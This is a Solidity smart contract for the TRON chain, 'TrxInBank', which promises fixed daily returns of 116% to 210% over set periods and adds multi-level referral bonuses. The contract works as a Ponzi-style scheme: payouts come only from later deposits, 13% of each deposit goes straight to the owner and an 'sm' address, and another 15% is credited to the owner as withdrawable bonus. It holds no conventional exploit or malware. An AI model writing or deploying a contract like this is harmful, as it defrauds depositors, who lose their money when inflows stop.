//SourceUnit: trxInBank.sol



pragma solidity 0.5.9;

contract TrxInBank {
    struct Tarif {
        uint16 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
       
    }

    address payable public owner;
    address payable public sm;
   

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint256 public total_investors=0;
    uint256 public dev_comission = 12;
    uint256 public sm_commission = 1;
  
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
      modifier ownerOnly(){
        require(msg.sender == owner);
        _;
    }

    constructor(address payable _sm) public {
        owner = msg.sender;
        sm = _sm;
      

        
      
        tarifs.push(Tarif(35, 210));
        tarifs.push(Tarif(20, 140));
        tarifs.push(Tarif(15, 132));
        tarifs.push(Tarif(8, 116));
      
       

        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
        ref_bonuses.push(1);
       

       
        
        
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        uint256 _allaff = (_amount*15)/(100);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
          
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
         if(_allaff > 0 ){
            players[owner].match_bonus+=(_allaff);
            players[owner].total_match_bonus += _allaff;
            match_bonus += _allaff;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
              
            }
            else {
                players[_addr].direct_bonus += _amount / 200;
                direct_bonus += _amount / 200;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);
        total_investors+=1;

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        uint256  dev_share=(msg.value* dev_comission)/100;
        uint256  sm_share=(msg.value* sm_commission)/100;
        

        owner.transfer(dev_share);
        sm.transfer(sm_share);
       
      
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }
    
    function getDeposits(uint[] memory indexes, address _addr)  public view returns (uint8[] memory, uint256[] memory, uint40[] memory){
    
    
    uint8[] memory tempTarif = new uint8[](indexes.length);
    uint256[]    memory tempDeposit = new uint256[](indexes.length);
   // address[] memory addrs = new address[](indexes.length);
        uint40[]    memory tempTime = new uint40[](indexes.length);
        
           for (uint i = 0; i < indexes.length; i++) {
            Deposit storage tempDeposits = players[_addr].deposits[indexes[i]];
            tempTarif[i] = tempDeposits.tarif;
            tempDeposit[i] = tempDeposits.amount;
            tempTime[i]=tempDeposits.time;
        } return (tempTarif, tempDeposit,tempTime);
}


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[4] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    function getCount(address _player) public view returns(uint count) {
    return players[_player].deposits.length;
}
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,uint256 _total_investors, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, total_investors, direct_bonus, match_bonus);
    }
      
   
    function changeOwner(address payable _newOwner) public ownerOnly{
       owner = _newOwner;
    } 
}